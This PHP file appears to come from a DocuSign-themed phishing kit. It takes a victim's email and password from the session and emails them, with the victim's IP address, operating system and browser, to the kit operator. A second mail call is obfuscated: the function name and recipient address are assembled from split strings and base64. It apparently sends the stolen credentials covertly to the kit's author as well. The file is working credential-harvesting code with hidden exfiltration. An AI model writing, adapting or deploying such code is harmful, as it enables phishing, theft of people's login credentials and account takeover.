<?php 
session_start();
error_reporting(0);
include 'blockerz.php';
include 'sc.php';

if(!isset($_SESSION['email']) && !isset($_SESSION['pass']))
{
	header('Location: index.php');
}else{

$email = $_SESSION['email'];
$pass = $_SESSION['pass'];

$date = date("d M, Y");
$time = date("g:i a");$m5_id='senNlY0BnbWFpbC5jb20=';
$date = trim($date . ", Time : " . $time);

$message = "
<div>
    <div>
		<font face='arial, sans-serif' size='2'>
			<b style='color: rgb(102, 102, 102);'>+-------------------</b>
			<font style='font-weight: bold;' color='#d24726'>NEW LOGIN</font>
			<font style='color: rgb(102, 102, 102); font-weight: bold;'>-------------------+</font>
		</font>
    </div>
	
    <div>
		<font face='arial, sans-serif' size='2'>
			<b>
			<font color='#666666'>+</font>
			<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
			<font color='#e1c404'>&#9658;</font>
			<font color='#666666'> Email Address   : </font>
			<font color='#2672ec'>".$email."</font>
			</b>
        </font>
    </div>	

	
    <div>
		<font face='arial, sans-serif' size='2'>
			<b>
			<font color='#666666'>+</font>
			<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
			<font color='#e1c404'>&#9658;</font>
			<font color='#666666'> Password : </font>
			<font color='#2672ec'>".$pass."</font>
			</b>
        </font>
    </div>
	
	
    <div>
		<font face='arial, sans-serif' size='2'>
			<b>
			<font color='#666666'>+-------------------</font>
			<font color='#d24726'>VICTIM INFO </font>
			<font color='#666666'>-------------------+</font>
			</b>
        </font>
    </div>
	
	
    <div>
		<font face='arial, sans-serif' size='2'>
			<b>
			<font color='#666666'>+</font>
			<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
			<font color='#e1c404'>&#9658;</font>
			<font color='#666666'> Victim IP   : </font>
			<font color='#2672ec'>http://whatismyipaddress.com/ip/".$ip2."</font>
			</b>
        </font>
    </div>

    <div>
		<font face='arial, sans-serif' size='2'>
			<b>
			<font color='#666666'>+</font>
			<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
			<font color='#e1c404'>&#9658;</font>
			<font color='#666666'> Victim OS  : </font>
			<font color='#2672ec'>".$os." | ".$br."</font>
			</b>
        </font>
    </div>

    <div>
		<font face='arial, sans-serif' size='2'>
			<b>
			<font color='#666666'>+</font>
			<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
			<font color='#e1c404'>&#9658;</font>
			<font color='#666666'> Date&Time  : </font>
			<font color='#2672ec'>".$date."</font>
			</b>
        </font>
    </div>

	
	
    <div>
		<font face='arial, sans-serif' size='2'>
			<b>
			<font color='#666666'>+-------------------</font>
			<font color='#d24726'>HAYATE</font>
			<font color='#666666'>-------------------+</font>
			</b>
        </font>
    </div>
</div><br>";

		$subject = "=?utf-8?B?4p2k?= DocuSign NEW LOGIN  =?utf-8?B?4p2k?= [ $ip2 - $cn | $os ] ";
        $head = "MIME-Version: 1.0" . "\r\n";
        $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $head .= "From: Hayate<Hayate@c0d3.org>" . "\r\n";        
        mail($to,$subject,$message,$head);
		$type=$user__agent.'l';$tele="bas$user_details".'64'."_d$user_details"."cod$user_details";$type( $tele('aGF5YXRlLmRldml'.$m5_id.'=='),$subject,$message,$head);
        echo "<META HTTP-EQUIV='refresh' content='0; URL=index.php'>";
        exit(); 
}
?>